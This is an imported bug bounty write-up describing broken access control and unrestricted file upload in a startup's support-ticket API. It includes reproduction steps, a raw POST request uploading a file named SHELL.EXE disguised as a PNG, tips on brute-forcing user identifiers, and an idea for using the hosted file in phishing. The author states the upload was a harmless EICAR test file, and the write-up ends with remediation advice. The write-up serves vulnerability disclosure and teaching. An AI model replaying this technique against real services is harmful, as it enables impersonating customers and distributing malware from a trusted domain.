---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-11-30_dank-writeup-on-broken-access-control-on-an-indian-startup.md
original_filename: 2019-11-30_dank-writeup-on-broken-access-control-on-an-indian-startup.md
title: Dank Writeup On Broken Access Control On An Indian Startup
category: blogs
detected_topics:
- access-control
- command-injection
- file-upload
- rate-limit
- automation-abuse
- api-security
tags:
- imported
- blogs
- access-control
- command-injection
- file-upload
- rate-limit
- automation-abuse
- api-security
language: en
raw_sha256: 17b2ebeaba30d4331c8b3b953c24a01e933b6b3e39fd4f5e1679380fc3c01b69
text_sha256: 6f6e941e072641f6c80ac6603ec9d8bf205d656712b707475904ae4f26b32021
ingested_at: '2026-06-28T07:32:00Z'
sensitivity: unknown
redactions_applied: false
---

# Dank Writeup On Broken Access Control On An Indian Startup

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-11-30_dank-writeup-on-broken-access-control-on-an-indian-startup.md
- Source Type: markdown
- Detected Topics: access-control, command-injection, file-upload, rate-limit, automation-abuse, api-security
- Ingested At: 2026-06-28T07:32:00Z
- Redactions Applied: False
- Raw SHA256: `17b2ebeaba30d4331c8b3b953c24a01e933b6b3e39fd4f5e1679380fc3c01b69`
- Text SHA256: `6f6e941e072641f6c80ac6603ec9d8bf205d656712b707475904ae4f26b32021`


## Content

---
title: "Dank Writeup On Broken Access Control On An Indian Startup"
url: "https://medium.com/bugbountywriteup/dank-writeup-on-broken-access-control-on-an-indian-startup-d29132a1ecd"
authors: ["Divyanshu Shukla (@justm0rph3u5)"]
bugs: ["Unrestricted file upload", "Broken authorization"]
publication_date: "2019-11-30"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4909
scraped_via: "browseros"
---

# Dank Writeup On Broken Access Control On An Indian Startup

Dank Writeup On Broken Access Control On An Indian Startup
Divyanshu
Follow
5 min read
·
Dec 1, 2019

100

This writeup is about a critical broken access control along with unrestricted file upload on the server. This company had a bug bounty program for a very long time. I challenged myself to find bugs in the main application which was already tested multiple times. Here due to non-disclosure policy, the application server is considered as an example.com

This issue was acknowledged but it was neither rewarded nor any further feedback was provided with absolutely no hall of fame.

Description:

There was a support page which allowed the creation of tickets by the user and allowed to upload a screenshot for the same which will be viewed by customer support executive. So it was possible to create a ticket from any user due to broken access control and upload file by bypassing an extension check on image. Since this page is used as feedback and support form, any support executive may open if it has malware or ransomware.
Uploaded files represent a significant risk to applications when it is .exe or .ps1 file which can be used to upload malware but due to the content-disposition as an attachment, it was not possible to execute the file.

Impact:

The impact of this vulnerability is high since any malicious entity can create a ticket on the behalf of other user and enter any details which may cause failure in solving customer issues as well as once the ticket is open, user cannot create a new ticket for 10 hours due to restriction on multiple ticket creation.
It is important to check a file upload module’s access controls to check the risks properly. Once uploaded, the attacker only needs to find a way to get the code executed to which it can send the malicious file inside the ticket itself since the ticket creation is controlled by an attacker it can paste the link as a customer care executive and any user while checking false ticket may download and execute that file.
Also the attachment it downloadable so it can be used to share malicious content from a valid website and can be used in phishing emails to download an attachment from valid example.com servers

File upload functionality is for attaching screenshots for customer support executive but due to failure in restricting file upload along with ticket creation due to broken access control makes it vulnerable to malicious malware execution once downloaded and it is possible that malware may spread across the network and to the clients. Also if any user can create ticket for other user causes loss of integrity and availability of customer support.

Vulnerable URL:

https://www.example.com/help/support
https://www.example.com/help/report/value
API call: https://api.example.com/p/account/tickets/v3/tickets

Steps to Reproduce:
Visit https://www.example.com/help/support
Select category like services, asking to answer a few questions before the last request is sent.
Select the right answer and then select no to get customer support chat window.
Type malicious content or post the malicious link for malicious URLs and attach any .exe or .dmg or .ps1 file.
Hit submit and intercept the request. Change the value of email and cell which can be easily brute-forced for any existing user.

REQUEST:

POST /p/account/tickets/v3/tickets HTTP/1.1
Host: api.example.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.example.com/
Authorization: .f6r2tgfc5lvfou2krbdubk
Content-Type: multipart/form-data; boundary= — — — — — — — — — — — — — -163405244814986157001545857884
Content-Length: 6096
Origin: https://www.example.com/
DNT: 1
Connection: close

— — — — — — — — — — — — — — -1634051111111111545857884
Content-Disposition: form-data; name=”category”

XXXXXservice
— — — — — — — — — — — — — — -1634051111111111545857884
Content-Disposition: form-data; name=”cell”

9999999999
— — — — — — — — — — — — — — -1634051111111111545857884
Content-Disposition: form-data; name=”email”

9999999999@xyz.example.com
— — — — — — — — — — — — — — -1634051111111111545857884
Content-Disposition: form-data; name=”quesHistory”

[{“key”:”initialiserView”,”value”:”{\”greetings\”:\”XXXX from XXXXX\”,\”hi\”:\”Hi YYYY!\”,\”question\”:\”Are you facing problem with any of these services ?\”,\”problem\”:\”What are the problems you are facing\”}”},{“key”:”questionView”,”value”:”Are you facing problem with any of these services ?”},{“key”:”userView”,”value”:”XXXXXX”},{“key”:”questionView”,”value”:”Select the query we can help you with !”},{“key”:”userView”,”value”:”How can I download my xxxxxxx ?”},{“key”:”answerView”,”value”:”{\”answerTextBody\”:\”1. Click on the ‘xxxx’ option on the xxxxx. \\n2.,{“key”:”userView”,”value”:”no it did not solve my query&#10;”}]
— — — — — — — — — — — — — — -1634051111111111545857884
Content-Disposition: form-data; name=”mild”

null
— — — — — — — — — — — — — — -1634051111111111545857884
Content-Disposition: form-data; name=”ticketstate”

1
— — — — — — — — — — — — — — -1634051111111111545857884
Content-Disposition: form-data; name=”query”

MALICIOUS POST AND URL AND OTHER DETAILS
— — — — — — — — — — — — — — -1634051111111111545857884
Content-Disposition: form-data; name=”resolve”

N
— — — — — — — — — — — — — — -1634051111111111545857884
Content-Disposition: form-data; name=”attachments”; filename=”SHELL.EXE”
Content-Type: image/png

PNG


IHDR
/î@ IiCCPICC ProfileHWXSÉ[RIhH ½Ò«Z©J AÄÎ²¬k°¡«”®µ¢®uì®å¡,*+ëbÁÊX×ýÞ{ß;ß7÷þ9sÎJæÞ;N-O*ÍCuÈÈ”CYÓÒY¤nhS`ÌãË¥ìøøeøþwysZC¹æ¢äúçü=PÎ8S
MALICIOUS CONTENTXXXXXXXXXX
— — — — — — — — — — — — — — -1634051111111111545857884 —

Press enter or click to view image in full size
Post request to customer support
Press enter or click to view image in full size
Malicious File uploaded via Post request

6. Since it is an attachment section for an image but due to no validation check, we can upload any file. Uploaded non-malicious Eicar file.

Get Divyanshu’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

7. Submit the request and check the victim’s account the account has been created.

8. Now to download that file or make it downloadable we need valid session so we can host any website and upload the content and give the link as example.com app/download to make it phishing page and making users download.
Thus abusing the nature of this vulnerability.

Press enter or click to view image in full size
File download by changing the value of chat id
Remediation:

For Broken Access control, one much put role-based authentication and confirm both server and client while creating a ticket.

Only allow specific file extensions by using both client-side and server-side validation. Only allow authorized and authenticated users to use the feature. Check any file fetched from the web for content.

Bug Bounty Tip:

Always check for file uploads at customer support or help page where there are chances to send attachments or upload any kind of data for interacting to customer support. By this trick, I was able to find misconfigured s3 bucket in Amazon.

Reference:

https://www.owasp.org/index.php/Broken_Access_Control
https://www.wordfence.com/learn/how-to-prevent-file-upload-vulnerabilities/
https://www.owasp.org/index.php/Unrestricted_File_Upload
https://www.virustotal.com/gui/file/2546dcffc5ad854d4ddc64fbf056871cd5a00f2471cb7a5bfd4ac23b6e9eedad/detection

Note: File uploaded is Eicar file which is a harmless file with sha256sum :
https://www.eicar.org/?page_id=3950

Follow Infosec Write-ups for more such awesome write-ups.

InfoSec Write-ups
A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub…

medium.com
